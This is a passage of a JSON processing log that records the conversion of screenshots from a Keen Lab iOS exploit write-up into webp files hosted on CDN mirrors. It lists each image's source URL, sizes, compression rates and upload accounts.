23:26:02","host":"us-007*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"145.7 KB","destSize":"43.2 KB","compressRate":"29.7%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-bae4db7b-80b1-47d5-bf07-1791f930661f.29.34PM.png","sourceStatusCode":200,"destWidth":2042,"destHeight":866,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn40@2020_5/2020/10/09/15-26-07-290_845a8f73da3041a8.webp","sourceBytes":145588,"destBytes":39542,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5702,"convertSpendMs":81,"createdTime":"2020-10-09 23:26:02","host":"us-017*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"142.2 KB","destSize":"38.6 KB","compressRate":"27.2%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-12at5-2206d15a-141d-42f8-837c-8550f78837ad.40.10PM.png","sourceStatusCode":200,"destWidth":1590,"destHeight":858,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn41@2020_5/2020/10/09/15-26-07-407_26642a779ba14001.webp","sourceBytes":155134,"destBytes":60106,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5900,"convertSpendMs":115,"createdTime":"2020-10-09 23:26:02","host":"us-006*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"151.5 KB","destSize":"58.7 KB","compressRate":"38.7%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-f863a95f-fb6b-4211-a7d2-1e198c91787d.26.36PM.png","sourceStatusCode":200,"destWidth":1726,"destHeight":712,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn35@2020_3/2020/10/09/15-26-07-814_74c6f4d5566f079c.webp","sourceBytes":119693,"destBytes":36392,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":6188,"convertSpendMs":84,"createdTime":"2020-10-09 23:26:02","host":"us-015*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"116.9 KB","destSize":"35.5 KB","compressRate":"30.4%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at6-8b337252-8801-4c79-a571-86b83d0769d4.22.03PM.png","sourceStatusCode":200,"destWidth":2192,"destHeight":790,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn31@2020_3/2020/10/09/15-26-08-975_f468a0eecfe97783.webp","sourceBytes":158641,"destBytes":48698,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":7543,"convertSpendMs":92,"createdTime":"2020-10-09 23:26:02","host":"us-028*","referer":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","linkMd5ListStr":"f777d2cb655ad641dc020ebf88116b5b","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"154.9 KB","destSize":"47.6 KB","compressRate":"30.7%"}],"successGithubMap":{"myreaderx15":1,"myreaderx7":1,"myreaderx27":1,"myreaderx11":1,"myreaderx22":1,"myreaderx2":1,"myreaderx30":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}}